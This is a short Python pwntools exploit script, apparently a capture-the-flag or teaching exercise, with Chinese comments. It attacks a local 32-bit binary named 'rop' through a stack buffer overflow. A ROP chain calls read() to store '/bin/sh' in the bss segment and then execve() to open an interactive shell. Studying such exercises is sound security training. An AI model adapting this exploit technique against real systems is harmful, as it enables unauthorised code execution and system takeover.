# coding=utf-8

from pwn import *

context.os = 'linux'
context.arch = 'i386'
context.log_level = 'debug'

p = process('./rop')
pop_eax_ret = 0x080b8016            # rop链 --- pop eax; ret
pop_edx_ecx_ebx = 0x0806ed00        # rop链 --- pop edx; pop ecx; pop ebx; ret
int_0x80 = 0x0806F430               # 80中断 --- call syscall
bss_addr = 0x080E9000               # bss段地址 --- 用于写入bin/sh

junk_bytes = 'a' * 0x0c             # 垃圾字节
fake_ebp = 'jjkk'                   # 覆盖原有caller函数的ebp

payload = junk_bytes + fake_ebp # 填充偏移的垃圾字节，并且覆盖caller函数的ebp


################################### read(0, bss+0x100, 8) ########################################
# read(0,bss+0x100,8)
# eax = 3
# ebx = 0(fd)
# ecx = bss+0x100(buf)
# edx = 8(char_count<-/bin/sh\x00)

payload += p32(pop_eax_ret) + p32(0x3)      # eax = 3
payload += p32(pop_edx_ecx_ebx) + p32(0x8) + p32(bss_addr+0x100) + p32(0x0) # edx = 8, ecx = bss段地址， ebx = 0
payload += p32(int_0x80)

#################################################################################################

################################### execve('/bin/sh', 0, 0) #####################################
# execve("/bin/sh",0,0)
# eax = 0xb
# ebx = bss+0x100
# ecx = 0
# edx = 0

payload += p32(pop_eax_ret) + p32(0xb)
payload += p32(pop_edx_ecx_ebx) + p32(0x0) + p32(0x0) + p32(bss_addr+0x100)
payload += p32(int_0x80)

################################################################################################
p.sendline(payload)
sleep(1)
p.sendline('/bin/sh\x00')
p.interactive()


